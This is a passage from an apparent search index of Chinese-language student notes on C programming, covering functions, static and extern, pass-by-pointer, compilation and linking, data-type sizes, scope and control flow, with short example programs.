\u5c31\u662f\u5728\u544a\u8bc9\u7cfb\u7a0b\u5e8f\u6267\u884c\u5b8c\u6bd5\uff0c\u548c\u65e9\u671f\u7684\u65f6\u949f\u673a\u5236\u6709\u5173</li> <li>\u5e93\u5c01\u88c5\u518d\u5206\u53d1\uff0c\u8fd9\u91cc\u6559\u6388\u63d0\u5230 Apple \u7684\u6807\u51c6\u5e93\u4e2d\u9ed8\u8ba4\u9690\u5f0f\u5f97\u5e2e\u4f60\u8c03\u7528\u4e86\u90e8\u5206 math \u5e93\u6240\u4ee5\u4f60\u4e0d\u7528 include, \u4f46\u662f\u5728 linux \u9700\u8981\u786e\u4fdd\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u6b63\u786e\u94fe\u63a5</li> <li>\u5728\u8db3\u591f\u5148\u8fdb\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u591a\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u53ef\u4ee5\u5171\u4eab\u4e00\u4e2a\u51fd\u6570\u7684\u5355\u4e2a\u5b9e\u4f8b\uff0c \u6bd4\u5982 printf\uff08\uff09 - \u524d\u63d0\u662f\u51fd\u6570\u7684\u4ee3\u7801\u4e0d\u80fd\u88ab\u4efb\u4f55\u8fdb\u7a0b\u4fee\u6539\uff0c\u5e76\u4e14\u8be5\u51fd\u6570\u5f15\u7528\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u4e0d\u540c data \u548c\u4f20\u9012\u7ed9\u51fd\u6570\u7684\u53c2\u6570\u3002</li> <li>main \u51fd\u6570\u5728\u6b63\u5f0f\u7f16\u5199\u65f6\u53ea\u505a\u53c2\u6570\u5f02\u5e38\u5904\u7406</li> </ol> <p>main() should be constrained to:</p> <ul> <li>receive and check the program's command-line arguments,</li> <li>report errors detected with command-line arguments, and then call exit(EXIT_FAILURE)</li> <li>call functions from main(), typically passing information requested and provided by the command-line arguments, and finally call exit(EXIT_SUCCESS) if all went well.</li> <li>All error messages printed to the stderr stream.</li> <li>All 'normal' output printed to the stdout stream</li> </ul> Application domain (a sample of) 3rd-party libraries operating system services (files, directories, processes, inter-process communication) OS-specific libraries, e.g. glibc, System32, Cocoa web-based programming libcgi, libxml, libcurl data structures and algorithms the generic data structures library (GDSL) GUI and graphics development OpenGL, GTK, Qt, wxWidgets, UIKit, Win32, Tcl/Tk image processing (GIFs, JPGs, etc) GD, libjpeg, libpng networking Berkeley sockets, AT&amp;T's TLI security, cryptography openssl, libmp scientific computing NAG, Blas3, GNU scientific library (gsl) concurrency, parallel and GPU programming OpenMP, CUDA, OpenCL, openLinda (thread support is defined in C11, but not in C99) <p>\u867d\u7136 C \u8bed\u8a00\u672c\u8eab\u6ca1\u6709\u592a\u591a\u5b9e\u73b0\u7684\u5185\u7f6e\u65b9\u6cd5\uff0c\u4f46\u4ecd\u7136\u6709\u5927\u91cf\u7684\u5171\u4eab\u5e93</p>"},{"location":"system/c_functions/#the-datatype-of-a-function","title":"The datatype of a function","text":""},{"location":"system/c_functions/#void","title":"void","text":"<p>\u4e0d\u4f5c return \u53ea\u505a printf </p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid output(char ch, int n)        \n{\n    for(int i=1 ; i&lt;=n ; i=i+1) {\n        printf(\"%c\", ch);\n    }\n}\n\nint main(int argc, char *argv[])\n{\n    output(' ', 19);\n    output('*',  1);\n    output('\\n', 1);\n    return 0;\n}\n</code></pre>"},{"location":"system/c_functions/#extern","title":"extern","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nextern double sqrt(double x);\n\nfloat square(float x)\n{\n    return x * x;\n}\n\nint main(int argc, char *argv[])\n{\n    if(argc &gt; 2) {\n      float a, b, sum;\n\n      a   = atof(argv[1]);\n      b   = atof(argv[2]);\n\n      sum = square(a) + square(b);\n      printf(\"hypotenuse = %f\\n\",\n             sqrt(sum) );\n    }\n    return 0;\n}\n</code></pre> <p>header file \u91cc\u5e76\u4e0d\u4f1a\u5305\u542b\u4ee3\u7801\u5b9e\u73b0\uff0c\u53ea\u4f1a declare \u6709\u8fd9\u4e2a sqrt \u65b9\u6cd5\u5b58\u5728\u8fd9\u53eb declaration\uff0c\u4f60\u9700\u8981\u81ea\u5df1\u53bb\u7528 extern \u91cd\u65b0\u4e66\u5199\u5176 definition \u907f\u514d\u5176\u9ed8\u8ba4\u4f7f\u7528 int \u5bf9\u5f85 args. double \u7684\u539f\u56e0\u4e3a\u5728 Linux \u4e2d\u5b9e\u9645\u4e0a\u6211\u4eec\u5e76\u4e0d\u4f1a\u4f7f\u7528\u592a\u591a float, \u7cbe\u5ea6\u4e0d\u591f\u65f6\u7cfb\u7edf\u4e00\u4f1a\u81ea\u52a8\u8fdb\u884c\u4e0b\u4e00\u7ea7\u7684\u4e0a\u5347</p>"},{"location":"system/c_functions/#common-mistakes","title":"Common mistakes","text":"<ol> <li>\u51fd\u6570\u4e0d\u9700\u8981\u5b9a\u4e49\u53c2\u6570\u4e5f\u53ef\u4ee5\u8fd0\u884c</li> </ol> <pre><code>void backup_files( void )            \n{\n    .....\n}\n</code></pre> <ol> <li>\u5728\u7f16\u5199 C \u8bed\u8a00\u4ee3\u7801\u65f6\uff0c\u4e0d\u8981\u4f9d\u8d56\u7279\u5b9a\u7684\u53c2\u6570\u6c42\u503c\u987a\u5e8f\uff0c\u56e0\u4e3a\u7f16\u8bd1\u5668\u4f18\u5316\u4ee5\u53ca\u4e0d\u540c\u67b6\u6784\u4e0b\u7684\u4f18\u5316\u7b56\u7565\uff0c\u4e0d\u540c\u67b6\u6784\u4e0b\u8fd0\u884c\u7684\u76f8\u540c\u4ee3\u7801\u53ef\u80fd\u4f1a\u5bfc\u81f4\u53c2\u6570\u6c42\u503c\u987a\u5e8f\u4e0d\u540c</li> </ol> <pre><code>int square( int a )\n{\n    printf(\"calculating the square of %i\\n\", a);\n    return a * a;\n}\n\nvoid sum( int x, int y )\n{\n    printf(\"sum = %i\\n\", x + y );\n}\n\n....\n\n    ....\n    sum( square(3), square(4) );\n</code></pre> <p>\u4ee5\u4e0a\u8fd9\u6bb5\u4ee3\u7801\u5728\u4e0d\u540c\u7684\u673a\u5668\u4e0b\u6267\u884c\u51fa\u6765\u7684\u7ed3\u679c\u4e0d\u540c\uff1a</p> <pre><code>    calculating the square of 3     // the output on PowerPC Macs\n    calculating the square of 4\n    sum = 25\n\nor\n\n    calculating the square of 4     // the output on Intel Macs\n    calculating the square of 3\n    sum = 25\n</code></pre>"},{"location":"system/c_functions/#static","title":"static","text":"<p>\u5bf9\u4e8e function \u6765\u8bf4\u7c7b\u4f3c\u4e8e Java \u7684 private \u7981\u6b62\u5916\u90e8\u8bbf\u95ee\uff0c\u79c1\u6709\u5316</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n//  myfunction IS ONLY VISIBLE WITHIN THIS FILE, AND IS CALLED BY main\nstatic void myfunction(void)\n{\n    static int count = 1;    //  retains its value between function calls\n    int        local = 0;    //  is re-initialised on each function call\n\n    printf(\"count=%i  local=%i\\n\", count, local);\n    ++count;\n    ++local;\n}\n\n//  main IS NOT DECLARED AS static BECAUSE THE OPERATING SYSTEM MUST BE ABLE TO CALL IT\nint main(int argc, char *argv[])\n{\n    for(int i=0 ; i &lt; 5 ; ++i) {\n        myfunction();\n    }\n    exit(EXIT_SUCCESS);\n}\n</code></pre> <p>\u8fd9\u91cc\u7684 count \u4f5c\u4e3a\u9759\u6001\u5173\u952e\u5b57\uff0c\u6574\u4e2a\u751f\u547d\u5468\u671f\u53ea\u4f1a\u88ab\u5206\u914d\u4e00\u6b21\u5185\u5b58\uff0c\u65e0\u8bba\u51fd\u6570\u8c03\u7528\u591a\u5c11\u6b21\u8be5\u53d8\u91cf\u4e5f\u4e0d\u4f1a\u521d\u59cb\u5316\uff0c\u800c local \u4f1a\u5728\u6bcf\u6b21\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u91cd\u65b0\u88ab\u521d\u59cb\u5316\u6210 0 \u4f5c\u7528\u57df\u4e3a\u51fd\u6570\u5185\u90e8</p> <pre><code>count=1  local=0\ncount=2  local=0\ncount=3  local=0\ncount=4  local=0\ncount=5  local=0\n</code></pre>"},{"location":"system/c_functions/#functions-receiving-a-variable-number-of-arguments","title":"Functions receiving a variable number of arguments","text":"<p>\u8fd9\u91cc\u7b80\u8981\u4ecb\u7ecd\u4e86 <code>printf</code> \u8fd9\u6837\u7684\u53c2\u6570\uff0c\u591a\u4e2a\u53ef\u53d8\u53d8\u91cf\u80fd\u591f\u7ed1\u5b9a string \u4e2d\uff0c\u5c31\u5fc5\u987b\u63d0\u4f9b <code>%d %s %i</code> \u8fd9\u79cd\u53c2\u6570</p> <p>\u6709\u65f6\u5019\u6211\u4eec\u9700\u8981\u7ed9\u7cfb\u7edf\u505a\u65e5\u5fd7\u8bb0\u5f55\u7684\u65f6\u5019\u751a\u81f3\u4e0d\u77e5\u9053\u53c2\u6570\u6570\u636e\u7c7b\u578b\u7684\u65f6\u5019\u5c31\u9700\u8981\u8c03\u7528\u7b2c\u4e09\u65b9\u5e93\u6bd4\u5982 <code>stdarg.h</code> \u53bb\u652f\u6301</p>"},{"location":"system/c_functions/#readings","title":"Readings","text":"<pre><code>#include &lt;stdio.h&gt;\n\n// This function takes no arguments and returns no value:\n\nvoid hello(void)\n{\n    printf(\"Hello, world!\\n\");\n}\n\nint main(void)\n{\n    hello();  // Prints \"Hello, world!\"\n}\n</code></pre> <p>function prototype \u662f\u5bf9\u51fd\u6570\u7684\u4e00\u79cd\u58f0\u660e\uff0c\u5b83\u5411\u7f16\u8bd1\u5668\u63d0\u4f9b\u4e86\u51fd\u6570\u7684\u540d\u79f0\u3001\u53c2\u6570\u7c7b\u578b\u4ee5\u53ca\u8fd4\u56de\u7c7b\u578b\uff0c\u4f46\u4e0d\u5305\u542b\u51fd\u6570\u7684\u5b9e\u9645\u5b9e\u73b0\uff08\u51fd\u6570\u4f53\uff09\u3002\u51fd\u6570\u539f\u578b\u901a\u5e38\u51fa\u73b0\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u6216\u5934\u6587\u4ef6\u4e2d\uff0c\u7528\u4e8e\u5728\u51fd\u6570\u8c03\u7528\u4e4b\u524d\u544a\u8bc9\u7f16\u8bd1\u5668\u51fd\u6570\u7684\u57fa\u672c\u4fe1\u606f\u3002</p> <pre><code>void foo();\nvoid foo(void);  // Not the same!\n</code></pre> <p>\u4ee5\u4e0a\u4e24\u884c\u5b8c\u5168\u4e0d\u4e00\u6837\uff0c\u540e\u8005\u5411\u7f16\u8bd1\u5668\u8868\u660e\u6ca1\u6709\u53c2\u6570\u540e\u6709\u6548\u5173\u95ed\u4e86\u7c7b\u578b\u68c0\u67e5\uff0c\u56e0\u6b64\u63a8\u8350\u5728\u7a7a\u53c2\u6570\u65f6\u4f7f\u7528 void \u58f0\u660e\u3002</p>"},{"location":"system/c_functions/#increment-value-copy","title":"Increment &amp; Value Copy","text":"<pre><code>int a = 5;\nint b = a++;\n</code></pre> <p>a++ \u4e3a\u540e\u7f6e\u81ea\u589e\uff0creturn \u539f\u6570\u503c\u540e\u518d\u52a0 1\uff0c\u56e0\u6b64 a \u7ed3\u679c\u4e3a 6\uff0cb \u4e3a 5</p> <pre><code>int a = 5;\nint b = ++a;\n\n// b = 6, a =6\n</code></pre> <p>++a \u4e3a\u524d\u7f6e\u81ea\u589e\uff0c\u7ed9\u539f\u6570\u503c\u5148\u52a0\u4e0a 1 \u540e\u518d return \u8be5\u503c</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid increment(int a)\n{\n    a++;\n}\n\nint main(void)\n{\n    int i = 10;\n\n    increment(i);\n\n    printf(\"i == %d\\n\", i);  // 10\n}\n</code></pre> <p>Pass by value</p> <p>\u5728 C \u8bed\u8a00\u4e2d\uff0c\u5f53\u4f60\u5c06\u4e00\u4e2a\u53d8\u91cf\u4f20\u9012\u7ed9\u51fd\u6570\u65f6\uff0c\u51fd\u6570\u63a5\u6536\u7684\u662f\u8be5\u53d8\u91cf\u7684\u526f\u672c\uff0c\u800c\u4e0d\u662f\u8be5\u53d8\u91cf\u7684\u5f15\u7528\u3002\u8fd9\u610f\u5473\u7740\u5728\u51fd\u6570 increment \u4e2d\uff0ca \u662f i \u7684\u526f\u672c\uff0c\u5bf9 a \u7684\u4efb\u4f55\u4fee\u6539\u4e0d\u4f1a\u5f71\u54cd main \u51fd\u6570\u4e2d\u7684 i\u3002\u5e76\u4e14 void \u51fd\u6570\u672c\u8eab\u65e0\u6cd5 return \u4efb\u4f55\u503c\uff0c\u56e0\u6b64\u7b54\u6848\u4e3a 10\uff0c\u8981\u60f3\u5728 void \u51fd\u6570\u7684\u65f6\u5019\u52a0 1 \u5c31\u8981\u7528\u5230\u6307\u9488\u6982\u5ff5\uff1a</p> <p>Pass by reference</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid increment(int *a) {\n    (*a)++;\n}\n\nint main(void) {\n    int i = 10;\n\n    increment(&amp;i);  // \u4f20\u9012 i \u7684\u5730\u5740\n\n    printf(\"i == %d\\n\", i);  // \u73b0\u5728\u8f93\u51fa\u662f 11\n}\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4fee\u6539\u540e\u7684\u4ee3\u7801\u4e2d\uff0cincrement \u51fd\u6570\u63a5\u6536 i \u7684\u5730\u5740\uff0c\u5e76\u76f4\u63a5\u5bf9 i \u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64 i \u7684\u503c\u4f1a\u88ab\u771f\u6b63\u589e\u52a0\uff0c\u8f93\u51fa\u4f1a\u662f 11\u3002</p>"},{"location":"system/c_syntax/","title":"2.1 C Basic Syntax","text":""},{"location":"system/c_syntax/#mon-lecture","title":"Mon Lecture","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\n/* Compile this program with:\n   cc -std=c11 -Wall -Werror -o rotate rotate.c\n */\n\n#define ROT 13\n\nstatic char rotate(char c)\n{\n    c = c + ROT;\n    return c;\n}\n\nint main(int argcount, char *argvalue[])\n{\n    // check the number of arguments\n    if(argcount != 2) {\n        exit(EXIT_FAILURE);\n    }\n    else {\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre> <ul> <li>C11 \u63d0\u4f9b\u4e24\u79cd\u7c7b\u578b\u7684 comments</li> </ul> <pre><code>/* block comments */\n// comments to the end of a line\n</code></pre> <ul> <li>main \u51fd\u6570\u6267\u884c\uff0c\u91cc\u9762\u7684\u53c2\u6570\u53eb args</li> </ul> <ul> <li>\u5f00\u5934\u7684 <code>#define</code> \u539f\u7406\u5982\u4e0b\uff1a</li> </ul> <p>\u5f53 C \u7f16\u8bd1\u5668\u9047\u5230 #define \u6307\u4ee4\u65f6\uff0c\u4f1a\u5728\u4ee3\u7801\u4e2d\u7528\u8be5\u5e38\u91cf\u6216\u5b8f\u7684\u503c\u66ff\u6362\u6bcf\u6b21\u51fa\u73b0\u7684\u5730\u65b9\u3002</p> <p>\u5728\u4f60\u7684\u4ee3\u7801\u7247\u6bb5\u4e2d\uff0c#define ROT 13 \u5b9a\u4e49\u4e86\u4e00\u4e2a\u540d\u4e3a ROT\uff0c\u503c\u4e3a 13 \u7684\u5b8f\u3002\u56e0\u6b64\uff0c\u6bcf\u5f53\u4ee3\u7801\u4e2d\u51fa\u73b0 ROT \u65f6\uff0c\u5b83\u5c06\u88ab\u66ff\u6362\u4e3a 13\u3002</p> <ul> <li><code>#include</code></li> </ul> <p><code>#include</code> \u6307\u4ee4\u7528\u4e8e\u5728\u4f60\u7684 C \u7a0b\u5e8f\u4e2d\u5305\u542b\u5916\u90e8\u6587\u4ef6\u3002\u88ab\u5305\u542b\u6587\u4ef6\u7684\u5185\u5bb9\u4f1a\u88ab\u63d2\u5165\u5230 <code>#include</code> \u6307\u4ee4\u7684\u4f4d\u7f6e\u3002</p> <p>\u4f8b\u5982\uff0c<code>#include &lt;stdio.h&gt;</code> \u5728\u4f60\u7684\u7a0b\u5e8f\u4e2d\u5305\u542b\u4e86\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5e93\uff0c\u4f7f\u4f60\u80fd\u591f\u4f7f\u7528 printf\u3001scanf \u7b49\u51fd\u6570\u3002</p> <p>\u5f53\u4f60\u8fd0\u884c C \u9884\u5904\u7406\u5668(\u5728\u5b9e\u9645\u7f16\u8bd1\u4e4b\u524d)\uff0c\u5b83\u4f1a\u5904\u7406\u8fd9\u4e9b\u6307\u4ee4\u5e76\u76f8\u5e94\u4fee\u6539\u4f60\u7684\u4ee3\u7801\u3002\u5728\u8fd9\u4e2a\u9884\u5904\u7406\u6b65\u9aa4\u4e4b\u540e\uff0c\u4fee\u6539\u540e\u7684\u4ee3\u7801\u5c06\u7531\u7f16\u8bd1\u5668\u8fdb\u884c\u7f16\u8bd1\u3002</p>"},{"location":"system/c_syntax/#compiler","title":"Compiler","text":"<ol> <li>\u7f16\u8bd1\uff08Compiler\uff09\uff1a</li> </ol> <p>\u6e90\u4ee3\u7801\uff08Source Code\uff09\u6587\u4ef6\uff08\u901a\u5e38\u4e3a.c\u6587\u4ef6\uff09\u7531\u7f16\u8bd1\u5668\u5904\u7406\u3002\u7f16\u8bd1\u5668\u9996\u5148\u5bf9\u4ee3\u7801\u8fdb\u884c\u9884\u5904\u7406\uff0c\u5904\u7406\u5982 <code>#include</code> \u548c <code>#define</code> \u7b49\u6307\u4ee4\u3002\u7136\u540e\uff0c\u5b83\u4f1a\u8fdb\u884c\u5b9e\u9645\u7684\u7f16\u8bd1\u8fc7\u7a0b\uff0c\u8fd9\u5305\u62ec\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790\u3001\u751f\u6210\u4e2d\u95f4\u4ee3\u7801\u3001\u4f18\u5316\u4ee5\u53ca\u6700\u7ec8\u751f\u6210\u673a\u5668\u4ee3\u7801\u3002\u7f16\u8bd1\u540e\u751f\u6210\u7684\u662f\u76ee\u6807\u6587\u4ef6\uff08Object File\uff09\uff0c\u901a\u5e38\u8fd9\u662f\u4e00\u79cd\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5305\u542b\u4e86\u4ece\u6e90\u4ee3\u7801\u7f16\u8bd1\u8fc7\u6765\u7684\u673a\u5668\u6307\u4ee4\uff0c\u4f46\u8fd9\u4e9b\u6307\u4ee4\u5c1a\u672a\u94fe\u63a5\u6210\u53ef\u6267\u884c\u7a0b\u5e8f\u3002</p> <ol> <li>\u94fe\u63a5\uff08Linker\uff09\uff1a</li> </ol> <p>\u94fe\u63a5\u5668\u8d1f\u8d23\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u76ee\u6807\u6587\u4ef6\u4e0e\u5e93\u6587\u4ef6\uff08Library Files\uff09\u7ed3\u5408\u8d77\u6765\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6\uff08Executable File\uff09\u3002\u94fe\u63a5\u8fc7\u7a0b\u89e3\u51b3\u4e86\u7a0b\u5e8f\u4e2d\u5bf9\u5e93\u51fd\u6570\u4ee5\u53ca\u7a0b\u5e8f\u4e2d\u5176\u4ed6\u6587\u4ef6\u7684\u51fd\u6570\u548c\u53d8\u91cf\u7684\u5f15\u7528\u95ee\u9898\u3002\u5982\u679c\u4f60\u7684\u7a0b\u5e8f\u8c03\u7528\u4e86\u4efb\u4f55\u5e93\u51fd\u6570\uff08\u6bd4\u5982\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5e93\u51fd\u6570\uff09\uff0c\u94fe\u63a5\u5668\u4f1a\u67e5\u627e\u8fd9\u4e9b\u51fd\u6570\u5728\u5e93\u6587\u4ef6\u4e2d\u7684\u5b9a\u4e49\uff0c\u5e76\u5c06\u5bf9\u5e94\u7684\u4ee3\u7801\u94fe\u63a5\u5230\u4f60\u7684\u7a0b\u5e8f\u4e2d\u4ee5\u786e\u4fdd\u7a0b\u5e8f\u5b8c\u6574\u6027\u3002</p> <ol> <li>\u5e93\u6587\u4ef6\uff08Library Files\uff09\uff1a</li> </ol> <p>\u5e93\u6587\u4ef6\u5305\u542b\u9884\u5b9a\u4e49\u7684\u51fd\u6570\u548c\u8d44\u6e90\uff0c\u8fd9\u4e9b\u53ef\u4ee5\u88ab\u591a\u4e2a\u7a0b\u5e8f\u5171\u540c\u4f7f\u7528\u3002\u4e0d\u9700\u8981\u91cd\u590d\u7f16\u5199\u5e38\u7528\u7684\u4ee3\u7801\uff0c\u53ea\u9700\u5728\u9700\u8981\u65f6\u94fe\u63a5\u76f8\u5e94\u7684\u5e93\u3002</p> <p></p>"},{"location":"system/c_syntax/#variables","title":"Variables","text":""},{"location":"system/c_syntax/#ram","title":"RAM","text":"<ul> <li>single integer value - 4 bytes</li> <li>single floating value - 8 bytes</li> </ul>"},{"location":"system/c_syntax/#name","title":"NAME","text":"<p>\u5b57\u6bcd\u6216\u4e0b\u5212\u7ebf\u5f00\u5934\uff0c\u540e\u63a5 _A-Za-z0-9</p> <p>C \u8bed\u8a00\u533a\u522b\u5927\u5c0f\u5199\uff0cC \u9884\u5904\u7406\u5668\u63d0\u4f9b\u7684\u5e38\u91cf\u4f7f\u7528\u5927\u5199\u8868\u793a\uff1a<code>MAXLENGTH, AVATAR, BUFSIZ, ROT</code></p> <p>\u8f83\u65e7\u7684 C \u7f16\u8bd1\u5668\u5c06\u53d8\u91cf\u540d\u79f0\u9650\u5236\u4e3a 8 \u4e2a\u552f\u4e00\u5b57\u7b26, \u5982\u679c\u4e3a\u65e7\u73af\u5883\u5f00\u53d1\u53ef\u79fb\u690d\u4ee3\u7801\uff0c\u8bf7\u8bb0\u4f4f\u8fd9\u4e00\u70b9</p>"},{"location":"system/c_syntax/#data-type","title":"Data Type","text":"<p>bool, char, int, float \u4ee5\u53ca double \u4e3a\u4e3b\u8981\u57fa\u7840\u6570\u636e\u7c7b\u578b</p> <p>\u5386\u53f2\u4e0a\uff0c\u4e0d\u540c\u8ba1\u7b97\u673a\u5236\u9020\u5546\u5728\u57fa\u672c\u6570\u636e\u7c7b\u578b\u7684\u5185\u5b58\u5927\u5c0f\u4e0a\u5b58\u5728\u5dee\u5f02\uff0c\u5bfc\u81f4\u4e0d\u517c\u5bb9\u6027\u95ee\u9898\u3002</p> <p>C \u8bed\u8a00\u901a\u8fc7\u4e0d\u6307\u5b9a\u6570\u636e\u7c7b\u578b\u7684\u5927\u5c0f\u6765\u89e3\u51b3\u6b64\u95ee\u9898\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u5728\u6e90\u4ee3\u7801\u7ea7\u522b\u5177\u6709\u53ef\u79fb\u690d\u6027\u3002</p> <p>C \u8bed\u8a00\u552f\u4e00\u8981\u6c42\u662f\u6570\u636e\u7c7b\u578b\u4e4b\u95f4\u7684\u5927\u5c0f\u5173\u7cfb\u5e94\u4e3a\uff1asizeof(char) \u2264 sizeof(short) \u2264 sizeof(int) \u2264 sizeof(long)\u3002</p> <p>\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784\u4e0a\u7684\u4e0d\u540c C \u7f16\u8bd1\u5668\u53ef\u4ee5\u4f7f\u7528\u4e0d\u540c\u5927\u5c0f\u7684\u6574\u6570\uff0c\u5bfc\u81f4\u5b58\u50a8\u5927\u5c0f\u7684\u53d8\u5316\u3002</p> <p>\u6d4b\u8bd5\u5f53\u524d\u67b6\u6784\u4e0b\u6570\u636e\u7c7b\u578b\u5185\u5b58\u5927\u5c0f\u4ee3\u7801\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(void)\n{\n    printf(\"char  %lu\\n\", sizeof(char));\n    printf(\"short %lu\\n\", sizeof(short));\n    printf(\"int   %lu\\n\", sizeof(int));\n    printf(\"long  %lu\\n\", sizeof(long));\n    return 0;\n}\n</code></pre> <p>Macbook Air M2 \u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>char  1\nshort 2\nint   4\nlong  8\n</code></pre> <p>\u8fd9\u610f\u5473\u7740\u8fd9\u53f0\u67b6\u6784\u7684\u8ba1\u7b97\u673a can only represent the values -2,147,483,648 to 2,147,483,647</p> <p>\u8fd9\u4e2a\u503c\u7684\u8ba1\u7b97\u516c\u5f0f\u4e3a 4 bytes = 4 * 8 bits = 32, 2^32 = 4294967296</p> <p>\u800c\u4e3a\u4e86\u8868\u8fbe\u6b63\u8d1f\u6570\uff0c\u9700\u8981\u5206\u914d\u4e00\u534a\u7ed9\u6b63\u6570\u4e00\u534a\u7ed9\u8d1f\u6570\uff0c\u6b63\u6570\u7684\u8303\u56f4\u662f 0 \u5230 2,147,483,647\uff0c\u8d1f\u6570\u7684\u8303\u56f4\u662f -1 \u5230 -2,147,483,648\u3002</p>"},{"location":"system/c_syntax/#the-scope-of-variables","title":"The scope of variables","text":"<p>C \u53ea\u6709 2 \u79cd\u4e3b\u8981\u7c7b\u578b\u7684\u8303\u56f4\uff1a</p> <ul> <li>global scope</li> </ul> <p>\u5168\u5c40\u4f5c\u7528\u57df\uff08\u6709\u65f6\u79f0\u4e3a\u6587\u4ef6\u4f5c\u7528\u57df\uff09\uff0c\u5176\u4e2d\u53d8\u91cf\u5728\u6240\u6709\u51fd\u6570\u548c\u8bed\u53e5\u5757\u4e4b\u5916\u58f0\u660e\uff0c\u4ee5\u53ca</p> <ul> <li>block scope in which variables are declared within a function or statement block.</li> </ul> <p>\u5728\u51fd\u6570\u6216\u8bed\u53e5\u5757\u4e2d\u58f0\u660e\u53d8\u91cf\u7684\u5757\u4f5c\u7528\u57df</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\nstatic int count = 0;\n\nint main(int argcount, char *argvalue[])\n{\n    int nfound = 0;\n\n    // check the number of arguments\n    if(argcount != 2) {\n        int nerrors = 1;\n\n        ....\n        exit(EXIT_FAILURE);\n    }\n    else {\n        int ntimes = 100;\n\n        ....\n        exit(EXIT_SUCCESS);\n    }\n    return 0;\n}\n</code></pre> <p>\u5176\u4e2d count \u4e3a global scope, static \u9632\u6b62\u5916\u90e8\u6587\u4ef6\u8bbf\u95ee\uff0cnfound\uff0cnerrors, ntimes \u5177\u6709 block scope </p> <p>C \u8bed\u8a00\u63a7\u5236\u6d41\u548c\u5176\u4ed6\u8bed\u8a00\u7c7b\u4f3c</p>"},{"location":"system/c_syntax/#conditional-execution","title":"Conditional execution","text":"<pre><code>if(condition1) {                \n  // more statements;\n  .....\n}\nelse if(condition2) {\n  // more statements;\n  .....\n}\nelse {\n  // more statements;\n  .....\n}\n</code></pre> <p>curly-brackets \u975e\u5fc5\u9700\u4f46\u662f\u548c Java \u4e00\u6837\u4e3a\u4e00\u79cd\u4e66\u5199\u683c\u5f0f\u6807\u51c6</p>"},{"location":"system/c_syntax/#boolean-values","title":"Boolean values","text":"<p>\u5728 ISO-C99 \u4e4b\u524d\uff0cC \u6807\u51c6\u6ca1\u6709\u5e03\u5c14\u6570\u636e\u7c7b\u578b, 0 \u4ee3\u8868 false 1 \u4ee3\u8868 true</p> <pre><code>int initialised = 0\n\nif (0 == initialised) {\n  // initialisation statements;\n  .....\n  initialised = 1; // set to true\n}\n</code></pre> <p>\u800c\u540e\u9700\u8981\u4f7f\u7528 true \u548c false constants \u7684\u65f6\u5019\u9700\u8981\u5012\u5165 <code>#include &lt;stdbool.h&gt;</code> \u5e93</p>"},{"location":"system/c_syntax/#switch-statements","title":"switch statements","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int value = 2;\n\n    // \u4f7f\u7528 if..else if..else \u7ed3\u6784\n    if(value == 1) {\n        printf(\"The value is 1.\\n\");\n    } \n    else if(value == 2) {\n        printf(\"The value is 2.\\n\");\n    } \n    else {\n        printf(\"The value is neither 1 nor 2.\\n\");\n    }\n\n    // \u4f7f\u7528 switch \u7ed3\u6784\n    switch(value) {          \n        case 1 :\n            printf(\"The value is 1.\\n\");\n            break;\n\n        case 2 :\n            printf(\"The value is 2.\\n\");\n            break;\n\n        default :\n            printf(\"The value is neither 1 nor 2.\\n\");\n            break;\n    }\n\n    return 0;\n}\n</code></pre> <ul> <li>\u6bcf\u4e2a case \u540e\u90fd\u5fc5\u987b\u52a0\u4e0a break \u79bb\u5f00 switch control flow\uff0c\u5982\u679c\u5fd8\u8bb0\u6dfb\u52a0 break \u8bed\u53e5\u5c31\u4f1a\u81ea\u52a8\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u4e2a case \u5206\u652f</li> <li>if \u548c switch \u4e2d\u7684 expression \u6570\u636e\u7c7b\u578b\u5fc5\u987b\u662f\u6574\u6570\u3001\u5b57\u7b26\u3001\u5e03\u5c14\u503c\u4e0e enumerated types\uff0c\u4f46\u662f\u4e0d\u80fd\u662f real \u6216 floating</li> <li>\u5982\u679c\u6bd4\u8f83\u503c\u8f83\u591a\u7684\u60c5\u51b5\u4e0b switch \u4e3a\u4f18\u5316\u4ee3\u7801\u91cf\u7b80\u6d01\u7684\u597d\u65b9\u6848\uff0c\u56e0\u4e3a case \u5185\u4e0d\u7528\u50cf if \u4e00\u6837\u6dfb\u52a0 curly brackets</li> </ul> <p>value \u8981\u5bf9\u6bd4\u7684\u53d8\u91cf\uff0cdefault \u53ef\u5f53\u4f5c if \u8bed\u53e5\u4e2d\u7684 else</p>"},{"location":"system/c_syntax/#for-bounded-loops","title":"for - bounded loops","text":"<p>\u6709\u754c\u5faa\u73af\u548c Java \u4e00\u6837\u8bed\u6cd5\uff1a</p> <pre><code>for(int i = 1 ; i &lt;= 10 ; i = 